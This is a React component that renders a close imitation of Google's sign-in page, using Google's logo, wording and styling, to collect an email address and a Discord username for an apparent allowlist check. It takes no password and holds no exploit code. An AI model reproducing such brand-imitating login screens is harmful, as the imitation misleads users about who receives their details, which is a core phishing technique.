import { useState } from "react";
import LinearProgress from "./LinearProgress.jsx";
import { requestAccess } from "./auth.js";

const GLogo = () => (
  <svg viewBox="-4.8 -4.8 57.6 57.6" width="48" height="48" aria-label="Google">
    <path
      fill="#EA4335"
      d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"
    />
    <path
      fill="#4285F4"
      d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"
    />
    <path
      fill="#FBBC05"
      d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"
    />
    <path
      fill="#34A853"
      d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"
    />
    <path fill="none" d="M0 0h48v48H0z" />
  </svg>
);

const ErrorIcon = () => (
  <svg width="16" height="16" viewBox="0 0 24 24" className="shrink-0 fill-current" aria-hidden="true">
    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z" />
  </svg>
);

const Chevron = () => (
  <svg width="20" height="20" viewBox="0 0 24 24" className="fill-[#5f6368] dark:fill-[#9aa0a6]">
    <path d="M7 10l5 5 5-5z" />
  </svg>
);

function FloatingField({ id, label, type = "text", value, onChange, onEnter, error, autoFocus }) {
  return (
    <div className="relative">
      <input
        type={type}
        id={id}
        value={value}
        onChange={onChange}
        onKeyDown={(e) => e.key === "Enter" && onEnter?.()}
        placeholder=" "
        autoFocus={autoFocus}
        spellCheck="false"
        autoComplete="off"
        className={`peer block w-full h-[56px] px-[15px] rounded-[4px] bg-transparent text-[16px] leading-6 text-[#1f1f1f] dark:text-[#e3e3e3] outline-none border transition-[border-color,box-shadow] duration-150
          ${
            error
              ? "border-[#b3261e] dark:border-[#f2b8b5] focus:border-2"
              : "border-[#747775] dark:border-[#8e918f] focus:border-[#0b57d0] dark:focus:border-[#a8c7fa] focus:border-2"
          }`}
      />
      <label
        htmlFor={id}
        className={`absolute left-[9px] px-[6px] pointer-events-none bg-white dark:bg-[#0e0e0e] transition-all duration-150 origin-left
          ${value ? "top-0 -translate-y-1/2 text-[12px]" : "top-1/2 -translate-y-1/2 text-[16px]"}
          peer-focus:top-0 peer-focus:-translate-y-1/2 peer-focus:text-[12px]
          ${
            error
              ? "text-[#5e5e5e] dark:text-[#c4c7c5] peer-focus:text-[#b3261e] dark:peer-focus:text-[#f2b8b5]"
              : "text-[#5e5e5e] dark:text-[#9aa0a6] peer-focus:text-[#0b57d0] dark:peer-focus:text-[#a8c7fa]"
          }`}
      >
        {label}
      </label>
    </div>
  );
}

export default function Login({ onSignIn }) {
  const [step, setStep] = useState("email");
  const [email, setEmail] = useState("");
  const [discord, setDiscord] = useState("");
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);

  const withLoading = (fn, ms) => {
    setLoading(true);
    setTimeout(() => {
      setLoading(false);
      fn();
    }, ms);
  };

  const next = () => {
    if (loading) return;
    if (!email.trim()) {
      setError("Enter an email or phone number");
      return;
    }
    setError("");
    withLoading(() => setStep("discord"), 900);
  };

  const signIn = async () => {
    if (loading) return;
    const name = discord.trim().replace(/^@/, "").toLowerCase();
    if (!name) {
      setError("Enter your Discord username");
      return;
    }
    if (!/^(?!.*\.\.)[a-z0-9_.]{2,32}$/.test(name)) {
      setError("Enter a valid Discord username");
      return;
    }
    setError("");
    setLoading(true);
    try {
      const result = await requestAccess({ email: displayEmail, discord: name });
      if (result.allowed) {
        onSignIn?.({ email: displayEmail, discord: name });
        return;
      }
      setError(result.reason || "This account isn’t approved for sign-in");
    } catch (err) {
      setError(
        err?.message === "network"
          ? "Couldn’t reach the server. Check your connection and try again."
          : err?.message === "aborted"
            ? "Sign-in cancelled."
            : "Something went wrong. Try again."
      );
    } finally {
      setLoading(false);
    }
  };

  const back = () => {
    setStep("email");
    setDiscord("");
    setError("");
  };

  const displayEmail = email.includes("@") ? email : `${email}@gmail.com`;

  const linkBtn =
    "text-[14px] font-medium text-[#0b57d0] dark:text-[#a8c7fa] hover:bg-[rgba(11,87,208,0.08)] dark:hover:bg-[rgba(168,199,250,0.08)] px-6 py-[10px] rounded-full";

  const primaryBtn =
    "text-[14px] font-medium px-6 h-10 rounded-full transition-colors bg-[#0b57d0] hover:bg-[#0a4bb8] active:bg-[#09429e] text-white dark:bg-[#a8c7fa] dark:hover:bg-[#c2d7fc] dark:text-[#062e6f]";

  return (
    <div className="min-h-screen w-full flex flex-col items-center bg-white md:bg-[#f0f4f9] dark:bg-[#0e0e0e] dark:md:bg-[#1e1f20] font-google text-[#1f1f1f] dark:text-[#e3e3e3]">
      <div className="flex-1 w-full flex flex-col items-center justify-start md:justify-center px-0 md:px-6 py-0 md:py-6">
        <div className="w-full md:w-[1040px] md:max-w-full bg-white dark:bg-[#0e0e0e] md:rounded-[28px] p-6 md:p-9 flex flex-col relative overflow-hidden">
          {loading && <LinearProgress className="absolute top-0 inset-x-0 md:inset-x-9 z-30" />}
          <div key={step} className="step-in flex flex-col md:flex-row">
            {/* LEFT */}
            <div className="md:flex-1 md:basis-0 min-w-0">
              <GLogo />
              {step === "email" ? (
                <>
                  <h1 className="mt-4 md:mt-6 text-[24px] md:text-[44px] leading-[32px] md:leading-[52px] font-normal">
                    Sign in
                  </h1>
                  <p className="text-[16px] leading-6 mt-2">Use your Google Account</p>
                </>
              ) : (
                <>
                  <h1 className="mt-4 md:mt-6 text-[24px] md:text-[44px] leading-[32px] md:leading-[52px] font-normal">
                    Welcome
                  </h1>
                  <div className="mt-3 md:mt-4">
                    <button
                      onClick={back}
                      className="inline-flex items-center gap-1.5 border border-[#747775] dark:border-[#8e918f] rounded-full pl-[3px] pr-2 h-8 hover:bg-[#f8f9fa] dark:hover:bg-[#1f1f1f] text-[14px] font-medium"
                    >
                      <svg width="24" height="24" viewBox="0 0 24 24" className="fill-[#1f1f1f] dark:fill-[#e3e3e3]">
                        <path d="M12 2a10 10 0 1 0 0 20 10 10 0 0 0 0-20zM7.07 18.28c.43-.9 3.05-1.78 4.93-1.78s4.51.88 4.93 1.78A7.9 7.9 0 0 1 12 20c-1.86 0-3.57-.64-4.93-1.72zm11.29-1.45c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33A7.95 7.95 0 0 1 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6zm0 5c-.83 0-1.5-.67-1.5-1.5S11.17 8 12 8s1.5.67 1.5 1.5S12.83 11 12 11z" />
                      </svg>
                      <span className="truncate max-w-[220px]">{displayEmail}</span>
                      <Chevron />
                    </button>
                  </div>
                </>
              )}
            </div>

            {/* RIGHT */}
            <div
              className={`md:flex-1 md:basis-0 min-w-0 mt-8 md:mt-0 md:pl-6 ${
                step === "email" ? "md:pt-[80px]" : "md:pt-[72px]"
              }`}
            >
              {step === "email" ? (
                <>
                  <FloatingField
                    id="email"
                    label="Email or phone"
                    value={email}
                    onChange={(e) => {
                      setEmail(e.target.value);
                      if (error) setError("");
                    }}
                    onEnter={next}
                    error={!!error}
                    autoFocus
                  />
                  {error && (
                    <div className="mt-[5px] flex items-center gap-2 text-[12px] leading-4 text-[#b3261e] dark:text-[#f2b8b5]">
                      <ErrorIcon />
                      <span>{error}</span>
                    </div>
                  )}

                  <button className={`mt-[3px] inline-flex self-start text-[14px] font-medium text-[#0b57d0] dark:text-[#a8c7fa] hover:bg-[rgba(11,87,208,0.08)] dark:hover:bg-[rgba(168,199,250,0.08)] px-[10px] py-[6px] -ml-[10px] rounded-full`}>
                    Forgot email?
                  </button>

                  <p className="text-[14px] leading-5 mt-[37px]">
                    Not your computer? Use Guest mode to sign in privately.{" "}
                    <a
                      href="#"
                      className="text-[#0b57d0] dark:text-[#a8c7fa] font-medium hover:underline"
                    >
                      Learn more about using Guest mode
                    </a>
                  </p>

                  <div className="flex items-center justify-end gap-4 mt-10">
                    <button className={linkBtn}>Create account</button>
                    <button onClick={next} className={primaryBtn}>
                      Next
                    </button>
                  </div>
                </>
              ) : (
                <>
                  <p className="text-[14px] leading-5 mb-12">To continue, enter your Discord username</p>
                  <FloatingField
                    id="discord"
                    label="Discord username"
                    value={discord}
                    onChange={(e) => {
                      setDiscord(e.target.value);
                      if (error) setError("");
                    }}
                    onEnter={signIn}
                    error={!!error}
                    autoFocus
                  />
                  {error ? (
                    <div className="mt-[5px] flex items-center gap-2 text-[12px] leading-4 text-[#b3261e] dark:text-[#f2b8b5]">
                      <ErrorIcon />
                      <span>{error}</span>
                    </div>
                  ) : (
                    <p className="mt-[5px] px-4 text-[12px] leading-4 text-[#444746] dark:text-[#c4c7c5]">
                      Your unique username, not your display name
                    </p>
                  )}

                  <div className="flex items-center justify-end gap-4 mt-[72px]">
                    <button className={linkBtn}>Try another way</button>
                    <button onClick={signIn} className={primaryBtn}>
                      Next
                    </button>
                  </div>
                </>
              )}
            </div>
          </div>
        </div>

      <footer className="w-full md:w-[1040px] md:max-w-full mt-6 md:mt-6 mb-4 md:mb-0 px-6 md:px-4 flex flex-col md:flex-row items-center md:justify-between gap-3 text-[12px] text-[#444746] dark:text-[#e3e3e3]">
        <div className="relative">
          <select className="bg-transparent outline-none pr-8 cursor-pointer hover:text-[#1f1f1f] dark:hover:text-[#e3e3e3] appearance-none">
            <option>English (United States)</option>
            <option>Español</option>
            <option>Français</option>
            <option>Deutsch</option>
            <option>日本語</option>
          </select>
          <svg
            className="absolute right-0 top-1/2 -translate-y-1/2 pointer-events-none fill-[#444746] dark:fill-[#9aa0a6]"
            width="14"
            height="14"
            viewBox="0 0 24 24"
          >
            <path d="M7 10l5 5 5-5z" />
          </svg>
        </div>
        <div className="flex gap-8">
          <a href="#" className="hover:text-[#1f1f1f] dark:hover:text-[#e3e3e3] hover:underline">
            Help
          </a>
          <a href="#" className="hover:text-[#1f1f1f] dark:hover:text-[#e3e3e3] hover:underline">
            Privacy
          </a>
          <a href="#" className="hover:text-[#1f1f1f] dark:hover:text-[#e3e3e3] hover:underline">
            Terms
          </a>
        </div>
      </footer>
      {loading && <div className="fade-in fixed inset-0 z-20 bg-white/50 dark:bg-black/40 cursor-wait" />}
      </div>
    </div>
  );
}
